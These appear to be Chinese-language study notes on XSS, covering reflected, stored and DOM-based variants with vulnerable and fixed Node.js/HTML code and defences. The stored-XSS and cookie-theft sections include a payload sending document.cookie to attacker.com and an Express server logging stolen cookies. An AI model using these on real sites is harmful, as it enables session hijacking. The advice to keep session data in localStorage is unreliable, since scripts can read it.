# [1. XSS网络攻击——原理，类型，实践](https://www.bilibili.com/video/BV1rg411v7B8/?spm_id_from=333.337.search-card.all.click&vd_source=a7089a0e007e4167b4a61ef53acc6f7e)

跨站脚本攻击  `Cross-Site Scripting`

**描述**：攻击者通过在应用中插入恶意脚本，利用用户的浏览器执行恶意代码

**防护措施**：使用内容安全策略（Content Security Policy, CSP）、对用户输入进行消毒和转义，避免使用危险的JavaScript函数

## 反射型XSS攻击

一般是利用网页的检索功能  

允许被攻击的一个测试网站：https://xss-game.appspot.com/level1/frame

| <img src="07 XSS攻击.assets/image-20240730211134332.png" alt="image-20240730211134332"  /> | <img src="07 XSS攻击.assets/image-20240730213001959.png" alt="image-20240730213001959" style="zoom:50%;" /> |
| ------------------------------------------------------------ | ------------------------------------------------------------ |

### 场景描述

假设一个使用Node.js和Express构建的简单Web应用程序，它允许用户在URL的查询参数中输入他们的名字，并将其显示在网页上。例如，用户访问`http://example.com/?name=John`，网页会显示“Hello, John”。

### 不安全的代码示例

以下是不安全的Node.js和Express应用程序代码示例：

```javascript
const express = require('express');
const app = express();
app.get('/', (req, res) => {
    const name = req.query.name;
    // 将用户输入的内容直接插入到HTML中，未进行任何过滤或编码
    res.send(`
        <html>
        <head><title>Reflected XSS Example</title></head>
        <body>
            <h1>Welcome</h1>
            <p>Hello, ${name}!</p>
        </body>
        </html>
    `);
});
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
```

### 攻击示例

在正常情况下，如果用户访问`http://localhost:3000/?name=John`，页面上会显示“Hello, John!”

然而，如果攻击者构造一个恶意链接，例如`http://localhost:3000/?name=<script>alert('XSS');</script>`，并诱使用户点击，网页会执行嵌入的JavaScript代码，显示一个警告框：

```html
<p>Hello, <script>alert('XSS');</script>!</p>
```

因为用户输入被直接插入到HTML中，浏览器会解析并执行嵌入的JavaScript代码，触发一个警告框显示“XSS”

### 安全的代码示例

为了防止反射型XSS攻击，应该对用户输入进行适当的编码或过滤，确保任何嵌入到HTML中的动态内容不会被浏览器解析为可执行代码。可以使用`escape-html`库来处理用户输入：

```javascript
const express = require('express');
const escapeHtml = require('escape-html'); // 用于HTML转义的库
const app = express();
app.get('/', (req, res) => {
    const name = req.query.name ? escapeHtml(req.query.name) : 'Guest';
    // 对用户输入进行HTML转义，防止XSS攻击
    res.send(`
        <html>
        <head><title>Reflected XSS Example</title></head>
        <body>
            <h1>Welcome</h1>
            <p>Hello, ${name}!</p>
        </body>
        </html>
    `);
});
app.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
```

在这个安全的版本中，即使攻击者尝试通过URL注入`<script>alert('XSS');</script>`，页面也只会显示为普通文本，而不会执行：

```html
<p>Hello, &lt;script&gt;alert('XSS');&lt;/script&gt;!</p>
```



```html
<!-- 转义前 -->
<p>Hello, <script>alert('XSS');</script>!</p>
<!-- 转义后 -->
<p>Hello, &lt;script&gt;alert('XSS');&lt;/script&gt;!</p>
```

转义后的代码不会被浏览器执行，因为浏览器将其视为普通文本，而不是HTML或JavaScript代码

HTML中的标签和一些特殊字符（如<,>,',"等）有特定的含义，尤其是\<script\>标签，它告诉浏览器接下来是脚本代码，应该执行其中的内容

### 总结

反射型XSS攻击通过将用户输入直接嵌入到HTML中而未进行适当的处理，使得攻击者可以在受害者的浏览器中执行恶意脚本。**防御反射型XSS的关键是对用户输入进行HTML转义或编码，确保这些输入不会被浏览器解释为可执行代**码。

## 存储型XSS攻击

- 一般会发生在可以发表评论的网站，黑客不发表正常的评论，而是把恶意代码脚本作为评论发送给网站服务器。如果服务器不进行过滤，就会把评论永久保存起来，常见的就是保存在数据库里面
- 用户浏览网站的时候会被迫看到有恶意代码的评论
- 看到恶意代码的同时，浏览器就会自动执行恶意代码？？？？？为什么？？？
  - 插入了类似<script></script>类似这样的代码
- 可能会把你的信息泄露给黑客，也可能执行的脚本是为黑客赚钱的
- 用户并不是因为点击乱七八糟的URL中招，而是在你访问网站评论区的时候就自动中招了

存储型 XSS（Stored Cross-Site Scripting）是一种 XSS 攻击类型，攻击者将恶意代码永久存储在目标应用的服务器上，然后在其他用户访问受感染的页面时自动执行该代码。这类攻击特别危险，因为它的恶意代码在服务器端存储并可以多次触发，影响广泛。

### 存储型 XSS 攻击的流程

1. **攻击者提交恶意代码**：攻击者通过网站的输入接口（例如评论、论坛帖子、用户资料等）提交包含恶意 JavaScript 代码的数据
2. **数据被存储**：由于网站未对用户输入进行严格的转义或过滤，恶意代码被直接存储在数据库中
3. **用户访问页面**：当其他用户访问该页面时，页面从数据库中获取数据并将恶意代码渲染在页面上
4. **代码执行**：浏览器解析 HTML 时会执行存储的 JavaScript 代码，从而窃取用户信息或进行其他恶意操作

### 举例：评论系统中的存储型 XSS 攻击

假设有一个网站允许用户在文章下方添加评论，而网站对用户输入的内容未进行严格的转义和过滤。

#### 攻击流程

1. **攻击者提交评论**：
   - 攻击者在评论中输入了恶意代码：
     ```html
     <script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>
     ```
   - 这段代码的功能是读取当前页面的 `document.cookie`，即用户的会话信息，并将其发送到攻击者控制的服务器（`https://attacker.com/steal`）。
   
2. **服务器存储评论**：
   - 网站未对评论内容进行安全转义，直接将这段包含恶意脚本的内容存入数据库中。

3. **受害者访问页面**：
   - 其他用户访问文章页面时，页面会从数据库中读取所有评论，并在页面上直接渲染出来。

4. **浏览器执行代码**：
   - 浏览器渲染页面时，评论中的 `<script>` 标签触发，恶意 JavaScript 被执行。
   - 这段代码会将受害者的 `document.cookie` 发送到攻击者的服务器。

#### 攻击后果

受害者的会话 cookie 被攻击者窃取后，攻击者可以利用这些信息模拟受害者的登录状态，访问受害者的账户，甚至进行数据篡改或资金盗窃等操作

### 如何防范存储型 XSS 攻击

防范存储型 XSS 攻击可以从输入的验证、输出的转义、安全策略等多个层面入手。以下是一些主要的方法：

#### 1. **转义用户输入**
   - **HTML 转义**：对于直接输出到 HTML 页面中的内容，将 `<`、`>`、`&`、`'`、`"` 等字符转义为 HTML 实体（例如 `&lt;`, `&gt;`）。
   - **JavaScript 转义**：如果用户输入将包含在 JavaScript 中，应对特殊字符进行转义以防止脚本注入。
   - **URL 转义**：如果用户输入会出现在 URL 参数中，应对其进行 URL 编码，以防止恶意代码通过 URL 传递。

#### 2. **严格内容过滤和验证**
   - **输入验证**：只接受符合预期格式的输入，使用白名单策略。例如，对于文本输入字段，只允许纯文本，拒绝 HTML 标签和特殊字符。
   - **限制输入长度**：限制输入长度以防止恶意代码过长。
   - **过滤特殊字符**：如果 HTML 是必须的，使用经过验证的库来过滤用户输入内容中的脚本和不安全标签，确保仅允许安全的 HTML 结构。

#### 3. **内容安全策略（CSP）**
   - 设置 CSP（Content Security Policy）来指定页面允许加载的内容来源。CSP 可以通过 HTTP 头 `Content-Security-Policy` 来指定。例如：
     ```http
     Content-Security-Policy: default-src 'self'; script-src 'self'
     ```
   - 限制脚本来源为同一域 (`'self'`)，防止外部脚本执行。此外，禁止使用内联脚本 (`'unsafe-inline'`) 可以进一步增强防护效果。

#### 4. **避免在 HTML 中插入用户输入的原始内容**
   - 使用安全的方式显示用户输入内容。例如，避免使用 `innerHTML` 和 `document.write()` 来渲染用户数据。可以用 `textContent` 或 `innerText` 来显示纯文本内容。
   - 在 React、Vue 等框架中，使用框架推荐的防 XSS 渲染方式，避免直接插入未转义的用户内容。

#### 5. **使用成熟的 XSS 过滤库**
   - 使用开源的 XSS 过滤库（如 [DOMPurify](https://github.com/cure53/DOMPurify)）清理用户生成的内容，这些库会去除输入内容中的恶意标签和脚本。
   - 对于 Node.js 应用，`express-validator` 等库也提供了防 XSS 的过滤选项，可以用于过滤和验证输入。

#### 6. **将敏感数据存储在安全的地方**
   - 不将敏感数据（例如用户身份标识）暴露在 `document.cookie` 中。可以将会话信息存储在 `sessionStorage` 或 `localStorage` 中，并使用安全的 HTTP-only Cookies。

#### 7. **定期进行安全测试**
   - 定期执行 XSS 渗透测试，识别应用中的潜在漏洞。可以使用自动化扫描工具（例如 Burp Suite、OWASP ZAP）检测应用是否易受 XSS 攻击。
   - 进行代码审计，查找和修复任何可能导致 XSS 漏洞的代码。

#### 8. **设置 SameSite Cookie 标记**
   - 为应用设置 SameSite Cookie 属性，防止恶意网站通过跨站点请求盗取 Cookie 信息。例如：
     ```http
     Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly
     ```
   - `SameSite=Strict` 或 `SameSite=Lax` 会限制 Cookie 的跨站请求，降低被恶意脚本盗用的风险。

### 示例：在 Express 应用中防范存储型 XSS

```javascript
const express = require('express');
const xss = require('xss');  // 使用 XSS 过滤库
const app = express();

// 使用 XSS 过滤器清理输入内容
app.post('/comment', (req, res) => {
    const cleanComment = xss(req.body.comment); // 过滤用户提交的评论内容
    // 将清理后的内容存入数据库
    saveCommentToDatabase(cleanComment);
    res.send('Comment submitted successfully!');
});

// 设置 Content Security Policy (CSP)
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'");
    next();
});

app.listen(3000, () => console.log('Server started on port 3000'));
```

以上方法可以综合应用，能大幅度减少存储型 XSS 的风险。

## DOM型XSS攻击

DOM型XSS（Document Object Model based Cross-Site Scripting）攻击的核心在于，恶意代码的注入和执行都发生在浏览器端的DOM操作中，而不是通过服务器端直接返回的响应。以下是一个详细的代码示例，展示了如何通过不安全的DOM操作导致DOM型XSS攻击

DOM 型 XSS 的核心是恶意数据直接注入到浏览器的 DOM 中，导致浏览器执行了恶意代码。不同于传统的存储型或反射型 XSS，DOM 型 XSS 的恶意数据不会通过服务器端的响应传回，而是直接通过 URL、`window.location`、`document.referrer`、`document.cookie` 等客户端内容注入的方式影响浏览器的 DOM 结构

### 场景描述

假设有一个网页允许用户在URL的查询参数中传递消息，并将该消息显示在页面上。例如，用户可以访问`example.com`并在URL中传递`?msg=Hello`，页面上就会显示“Hello”。

### 不安全的代码示例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOM XSS Example</title>
</head>
<body>
    <h1>Your Message:</h1>
    <div id="message"></div>

    <script>
        // 获取URL中的查询参数
        var urlParams = new URLSearchParams(window.location.search);
        var msg = urlParams.get('msg');
        // 将msg的内容直接插入到页面中
        document.getElementById('message').innerHTML = msg;
    </script>
</body>
</html>
```

### 攻击示例

如果用户访问`example.com?msg=Hello`，页面上将显示“Hello”。但如果攻击者修改URL为`example.com?msg=<script>alert('XSS');</script>`，浏览器会执行传入的JavaScript代码，触发一个警告框显示“XSS”。

这个例子中，攻击者成功地通过修改URL在页面中插入并执行了恶意脚本。

### 安全的代码示例

为了防止这种攻击，应该避免直接使用`innerHTML`，而是使用更安全的方法将内容插入DOM，如使用`textContent`，这样浏览器就不会将输入内容作为HTML解析和执行：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOM XSS Example</title>
</head>
<body>
    <h1>Your Message:</h1>
    <div id="message"></div>

    <script>
        // 获取URL中的查询参数
        var urlParams = new URLSearchParams(window.location.search);
        var msg = urlParams.get('msg');

        // 使用textContent而不是innerHTML来设置文本
        document.getElementById('message').textContent = msg;
    </script>
</body>
</html>
```

在这个安全的版本中，即使攻击者尝试通过URL注入`<script>alert('XSS');</script>`，浏览器也只会将其显示为普通文本，而不会执行。

### 总结
DOM型XSS攻击主要通过不安全的DOM操作实现，攻击者可以在浏览器端注入并执行恶意代码。防御措施包括避免使用`innerHTML`等容易导致XSS的操作，以及对用户输入进行严格的验证和编码。

## 反射型和DOM型XSS攻击的区别

反射型 XSS 和 DOM 型 XSS 都是跨站脚本攻击的一种，但两者的区别在于攻击的实现方式和恶意代码的执行位置。以下是它们的主要区别：

### 1. **执行恶意代码的来源**
   - **反射型 XSS**：恶意代码通过服务器返回给用户。攻击的实现过程通常是将恶意代码注入到 URL 参数或表单中，服务器处理请求并返回包含恶意脚本的页面。例如，用户点击了一个恶意链接，服务器接收到这个请求后将用户输入直接反射在响应页面中。
   - **DOM 型 XSS**：恶意代码直接在浏览器中执行，而无需经过服务器处理。这种攻击主要利用客户端 JavaScript 操作 DOM 的方式，将恶意数据插入到页面中。例如，恶意脚本嵌入在 URL 的 hash 部分或浏览器的其他可控对象（如 `window.location`）。

### 2. **攻击的实现途径**
   - **反射型 XSS**：恶意脚本是通过 HTTP 请求发给服务器，服务器在响应中包含未经过滤的数据。这种类型的攻击依赖于服务端响应未对用户输入进行处理。
   - **DOM 型 XSS**：恶意脚本完全在客户端执行，不依赖服务器端的数据返回。攻击者构造恶意 URL，使得客户端 JavaScript 在浏览器中将 URL 的内容插入到 DOM 中，从而导致恶意代码执行。

### 3. **数据处理位置**
   - **反射型 XSS**：数据处理在服务器端，服务器会将请求中的数据嵌入到响应 HTML 中。
   - **DOM 型 XSS**：数据处理在客户端，浏览器直接解析 URL 等客户端数据并操作 DOM。即便服务器返回的内容是安全的，客户端代码不正确地使用数据也会造成 XSS。

### 4. **恶意代码的传播方式**
   - **反射型 XSS**：通常需要用户点击攻击者构造的恶意链接，链接中包含的恶意代码被发送到服务器，服务器将其嵌入响应中。
   - **DOM 型 XSS**：往往通过 URL 或页面中已有的客户端代码执行恶意操作，无需向服务器发送数据。例如，URL 的 hash 部分可以直接在客户端操作而不会被发送到服务器。

### 示例对比

- **反射型 XSS** 示例：
  假设有一个搜索页面，URL 如 `http://example.com/search?q=hello`。服务器会将 `q` 参数的值直接嵌入到页面的 HTML 中，例如：
  ```html
  <p>Search results for: hello</p>
  ```
  如果攻击者构造了如下恶意链接：
  ```
  http://example.com/search?q=<script>alert('XSS')</script>
  ```
  服务器未进行过滤，返回页面中包含了 `<script>alert('XSS')</script>`，恶意代码会在用户浏览器中执行。

- **DOM 型 XSS** 示例：
  在页面中，JavaScript 使用了 `window.location.hash` 来生成内容：
  ```javascript
  document.getElementById("output").innerHTML = window.location.hash.substring(1);
  ```
  攻击者可以构造如下 URL：
  ```
  http://example.com/page#<script>alert('XSS')</script>
  ```
  当用户访问该 URL，JavaScript 会将 `window.location.hash` 的内容插入 DOM，导致浏览器执行 `<script>alert('XSS')</script>`。

### 总结

| 特性               | 反射型 XSS                 | DOM 型 XSS                              |
| ------------------ | -------------------------- | --------------------------------------- |
| 恶意代码的来源     | 服务器端响应               | 客户端 DOM 操作                         |
| 攻击途径           | 通过服务器返回的数据       | 通过客户端代码和 DOM 操作               |
| 数据处理位置       | 服务器端处理               | 客户端浏览器直接解析和执行              |
| 恶意代码的触发方式 | 用户访问带有恶意代码的链接 | 用户访问特定的 URL、JavaScript 操作 DOM |

两者虽然类似，但区别主要在于数据的流向和处理位置。

# [2. XSS跨站脚本分类](https://www.bilibili.com/video/BV1ZR4y1V7GN/?spm_id_from=333.337.search-card.all.click&vd_source=a7089a0e007e4167b4a61ef53acc6f7e)

> Cross-Site Scripting 跨站脚本攻击
>
> scripting：脚本语言，脚本撰写，脚本处理

![image-20240730215854717](07 XSS攻击.assets/image-20240730215854717.png)

<img src="07 XSS攻击.assets/image-20240730220139675.png" alt="image-20240730220139675" style="zoom:67%;" />

## 1.1 反射型XSS

![image-20240730225028286](07 XSS攻击.assets/image-20240730225028286.png)

# [3. 反射XSS盗取Cookie](https://www.bilibili.com/video/BV1ZR4y1V7GN/?p=2&spm_id_from=pageDriver&vd_source=a7089a0e007e4167b4a61ef53acc6f7e)

## 2.1 cookie介绍

<img src="07 XSS攻击.assets/image-20240731092401699.png" alt="image-20240731092401699" style="zoom:50%;" />

## 2.2 反射XSS盗取cookie

反射型XSS（Cross-Site Scripting）攻击是一种常见的网络攻击方式，攻击者利用网页的漏洞将恶意脚本注入到网页中，并使得这个脚本在用户浏览器中执行，从而窃取用户的敏感信息，例如 cookie。以下是如何利用反射型XSS盗取 cookie 的一般步骤：

### 1. **了解反射型 XSS**

**反射型 XSS 攻击发生在攻击者将恶意脚本嵌入到请求中，服务器将该请求的内容原样返回并嵌入到响应中。用户浏览器执行这些恶意脚本，从而泄露敏感信息或执行其他恶意操作**。

### 2. **构造恶意请求**

攻击者需要构造一个恶意 URL 或请求，将恶意脚本注入到请求中。例如，如果一个网站存在反射型 XSS 漏洞，用户的请求中的参数值被直接插入到 HTML 中，攻击者可以利用这种漏洞。

#### 示例恶意 URL

假设某个网站的 URL 参数被直接插入到 HTML 中：

```html
<p>Hello, <span id="user">USER_NAME</span>!</p>
```

攻击者可以构造如下 URL 来注入恶意脚本：

```plaintext
http://example.com/?name=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

在这种情况下，当受害者访问上述 URL 时，浏览器会执行注入的 JavaScript 代码，将用户的 cookie 发送到攻击者控制的服务器。

### 3. **处理并拦截 cookie**

攻击者需要设置一个恶意服务器来接收被盗取的 cookie。这个服务器可能只是一个简单的服务器，记录收到的请求。

#### 示例恶意服务器（使用 Node.js 和 Express）

```javascript
const express = require('express');
const app = express();

app.get('/steal', (req, res) => {
  // 记录被盗取的 cookie
  console.log('Cookie stolen:', req.query.cookie);
  res.send('Cookie stolen');
});

app.listen(3000, () => {
  console.log('Listening on port 3000');
});
```

### 4. **防范措施**

为防止 XSS 攻击，网站开发者应采取以下措施：

1. **输入验证和清理**：
   - 过滤和清理用户输入，确保没有恶意脚本被注入到页面中。
   
2. **输出编码**：
   - 对动态内容进行适当的 HTML 编码，例如，使用函数 `encodeURIComponent` 来处理 URL 参数，以避免插入恶意代码。

3. **使用 CSP（Content Security Policy）**：
   - 实施内容安全策略，限制可以在页面中执行的脚本来源，从而减少 XSS 攻击的风险。

4. **HttpOnly 和 Secure Cookie 标志**：
   - 对敏感 cookie 设置 `HttpOnly` 和 `Secure` 标志，防止客户端 JavaScript 访问 cookie。

5. **跨站请求伪造（CSRF）保护**：
   - 使用 CSRF 令牌来防止未经授权的请求。

### 总结

反射型 XSS 攻击通过将恶意脚本注入到网站中，从而盗取用户的 cookie。防范此类攻击需要确保输入和输出的安全性，实施适当的安全措施，例如 CSP、HttpOnly 和 Secure 标志等。了解如何防范 XSS 攻击是确保网站安全的关键。

## 2.3 利用cookie会话劫持

## 2.4 劫持会话后的操作









































